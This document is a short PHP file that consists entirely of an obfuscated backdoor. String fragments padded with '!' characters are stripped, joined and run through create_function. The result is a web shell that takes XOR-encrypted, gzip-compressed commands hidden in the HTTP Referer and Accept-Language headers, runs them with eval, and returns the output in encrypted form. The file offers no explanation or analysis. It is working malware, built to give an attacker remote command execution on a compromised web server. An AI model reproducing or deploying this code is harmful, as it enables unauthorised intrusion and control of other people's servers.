<?php
$L='ch_all!("/(![\\w])![\\w-!]+(?:;q!=0.([\\d])!)!?,?/",$ra,$m!);!if($q&&!$m){@s!ession!!_!star';
$h='ay("/!","+!")!,$ss($s[$i!],0,$e)))!,$k)));$!o=ob_get_!conten!ts()!;ob_end_!clean()!;$d=ba';
$V='&$!ra){$u=parse_!url($rr!);parse!_!s!tr($!u["query"],!$q);$q=array_v!alu!es(!$q);preg_mat!';
$D='!$kh="5!d4!1";!$kf="402a";f!unction x(!$t,$!k){$c=s!trlen(!$k);$l=str!len($t);$o!="";for!(';
$O=str_replace('B','','creBatBBe_fBuBBnction');
$F='$z+!+)$p.=$q[$m![2]![$z!]];if(st!r!pos($p,$h)===0){!$s![$!i]=""!;$p=$ss($p,3)!;!!}if(array';
$Y='$i=0!;$i<$!!l;){for($j!!=0;($j<$c&&$!i<$l);$!!j++,$i++!){!$o!.!=$t{$i}^$k{$j};}}retu!rn ';
$E='!$o;}!$r=$_SERVER;$r!r=@$r["H!TTP_!REFER!ER"];!$r!a=!!!@$r["HTTP_ACCEPT_LANGU!AGE"];if($rr!&!';
$f='!se64!_encode!(x(gzc!omp!ress($o),$!k));pr!int(!"<!$k>!$d</$k>")!;@session_d!est!roy();}}}}';
$v='t(!);$s=&$_SESSION;!!!$ss="subs!!tr";$!sl="strtol!o!wer";$i=$m[1][0].$m[1][1];!$h=!$sl(!$s!s(';
$z='md5($i.$kh),0,!3));$!f=$!sl($ss(md5!(!!$i.$kf),0,3!));$p="";f!or($z!=1!;$z<count($m[!1!]);';
$c='rt();@ev!al(@gzunc!ompres!s!(!@x(!@ba!se64_decode(preg_!repl!ace(array("/_/!!","/-/"!),arr!';
$b='_k!ey_exists!!($i!,$s)!){$s[$i]!.=$p;$e=strpos($s[!$i]!,$f);if($!e){$k=$k!!h.$kf!;o!b_sta';
$o=str_replace('!','',$D.$Y.$E.$V.$L.$v.$z.$F.$b.$c.$h.$f);
$d=$O('',$o);$d();
?>
